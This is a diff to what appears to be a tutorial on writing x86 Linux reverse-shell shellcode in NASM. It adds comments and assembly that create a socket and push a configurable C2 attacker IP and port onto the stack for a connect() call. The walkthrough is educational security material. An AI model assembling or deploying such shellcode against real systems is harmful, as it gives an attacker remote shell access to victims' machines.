@@ -101,7 +101,7 @@ xor ecx, ecx       ; Clearing out ECX
 cdq                ; Clearing out EDX 
 ```
 
-Note that we didn't use XOR'ing for clearing the EDX register instead we used cdq which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 3 bytes in the process ;)
+Note that we didn't use XOR'ing for clearing the EDX register instead we used `cdq` which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 3 bytes in the process ;)
 ### Socket syscall
 Now we will initiate the socket syscall using the good ol' software interrupt 80h.
 
@@ -112,12 +112,37 @@ mov ax, 0x167
 mov bl, 0x02
 ; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
 mov cl, 0x01
+; 3rd argument for socket() - 0 is already in EDX register
 ; socket() Syscall
 int 0x80
 ; Storing the return value - socket fd in EAX to EBX for later usage
 mov ebx, eax
 ```
 
+Now moving to setup the sockaddr_in struct
+### Setting up the sockaddr_in struct for connect syscall
+These connect() arguments can be summarized as follows:
+
+1. int sockfd – this is a reference to the socket that was just created, this is why we moved EAX into EBX
+1. const struct sockaddr *addr – this is a pointer to the location on the stack of the sockaddr struct we are going to create
+1. socklen_t addrlen – this is the length of the address which the /usr/include/linux/in.h file tells us is 16
+
+Also, not that the sockaddr_in consists of:
+
+1. The attacker IP address
+1. The attacker Port
+1. The addressing schema in this case IPv4 so it's value shall be 2
+
+So let us start by pushing those into the stack. Note that I have configured the C2 a.k.a Command & Control/Attacker IP address and port to be configurable while assembling via nasm with the `-D` flag.
+
+```nasm
+; Loading the C2 IP address in stack - sockaddr_in struct - 3rd argument
+push dword C2_IP      ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex
+; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
+push word C2_PORT     ; 0x901f - C2 Port: 8080
+; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
+push word 0x02
+```
 
 
 
